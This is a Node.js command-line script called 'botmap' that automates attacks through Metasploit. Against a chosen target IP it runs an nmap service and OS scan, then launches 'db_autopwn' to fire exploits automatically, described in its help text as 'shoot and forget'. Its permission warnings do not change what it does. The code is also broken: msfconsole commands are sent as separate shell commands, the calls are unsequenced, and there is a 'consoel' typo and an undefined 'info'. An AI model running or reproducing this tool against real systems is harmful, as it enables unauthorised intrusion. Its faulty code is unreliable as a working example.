'use strict';

var _fs = require('fs');

var _fs2 = _interopRequireDefault(_fs);

var _child_process = require('child_process');

var _safe = require('colors/safe');

var _safe2 = _interopRequireDefault(_safe);

var _prompt = require('prompt');

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

//set theme
_safe2.default.setTheme({
  silly: 'rainbow',
  input: 'grey',
  verbose: 'cyan',
  prompt: 'grey',
  info: 'green',
  data: 'grey',
  help: 'cyan',
  warn: 'yellow',
  debug: 'blue',
  error: 'red'
});

//make sure that the user know what he's doing
function userAuth() {
  console.warn(_safe2.default.warn("Note,that you need the permission of the target's owner !"));
  console.warn(_safe2.default.warn('Are you sure you want to scan and attack: \n' + target));
  console.log(_safe2.default.prompt('Press y to continue'));
  var input = prompt();

  if (input != 'y') {
    console.log(info('Maybe a wise decision..'));
    process.exit(1);
  }
}

//perform exploit
function exploit(target) {
  console.log(_safe2.default.info('Starting ...'));
  console.warn(_safe2.default.warn('Once again... I hope you now what you are doing...'));
  //start postgresql
  (0, _child_process.exec)('service postgresql start', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not start postgresql! \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('started postgresql'));
    }
  });
  //start msf
  (0, _child_process.exec)('msfconsole', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not initialize msfdb! \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('started msf'));
    }
  });
  (0, _child_process.exec)('workspace botmap', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Error\n' + error));
      console.error(_safe2.default.error('Running "botmap setup" may fix this...'));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('switched workspace'));
    }
  });
  console.log(_safe2.default.info('Starting scan...'));
  (0, _child_process.exec)('db_nmap -sS -sV -sU -n -O ' + target, function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not scan target \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('scan finished'));
    }
  });
  (0, _child_process.exec)('db_hosts', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not get host info... \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('HOST:' + stdout));
    }
  });
  console.warn(_safe2.default.warn('Note that the following action can bring you to jail ! \n Botmap can not stop the action once it started !'));
  (0, _child_process.exec)('db_autopwn -p -t -e', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Can not pwn the target... \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('Exploit started... \n You will have a session if any of the exploits worked...'));
    }
  });
}

function setup() {
  console.log(_safe2.default.info('Botmap is setting up a db workspace...'));
  (0, _child_process.exec)('service postgresql start', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not start postgresql \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('started postgresql'));
    }
  });
  (0, _child_process.exec)('service metasploit start', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not start msf \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('started msf'));
    }
  });
  (0, _child_process.exec)('workspace -a botmap', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not create workspace\n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('created workspace'));
    }
  });
  (0, _child_process.exec)('workspace botmap', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not switch to workspace \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('switched workspace'));
    }
  });
  (0, _child_process.exec)('exit', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not exit msfdb \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('exited mdfdb'));
    }
  });
  consoel.log(_safe2.default.silly('Setup complete !'));
}

var userArgs = process.argv.slice(2);
var target = undefined;
//argument handling, a bit of small talk, blabla
if (userArgs[0] == 'target' || userArgs[0] == '-t') {
  //botmap target [arget]
  target = userArgs[1];
  userAuth();
  exploit(target);
} else if (userArgs[0] == 'info' || userArgs[0] == 'about') {
  //botmap info | botmap about
  console.log(_safe2.default.info('------------------------------------------'));
  console.log(_safe2.default.info('Author: Coretool'));
  console.log(_safe2.default.info('Version: 0.1.0'));
  console.log(_safe2.default.info('License: MIT'));
  console.log(_safe2.default.info('Note that I am not responsible \n for what you do with botmap.'));
  console.log(_safe2.default.info('------------------------------------------'));
  process.exit(0);
} else if (userArgs[0] == 'help' || userArgs[0] == '-h') {
  //botmap help | botmap -h
  console.log(_safe2.default.help('------------------------------------------'));
  console.log(_safe2.default.help('botmap [command] [argument] where: '));
  console.log(_safe2.default.help('command is one of the following\n target [traget ip]: set target, shoot and forget \n about : display the info about botmap \n clean : to clean the temp.json \n help to display this menu '));
  console.log(_safe2.default.help('------------------------------------------'));
} else if (userArgs[0] == 'setup') {
  //botmap setup
  setup();
} else {
  //botmap [wrong args]
  console.error(_safe2.default.red('Unknownen Argument(s)'));
  process.exit(1);
}
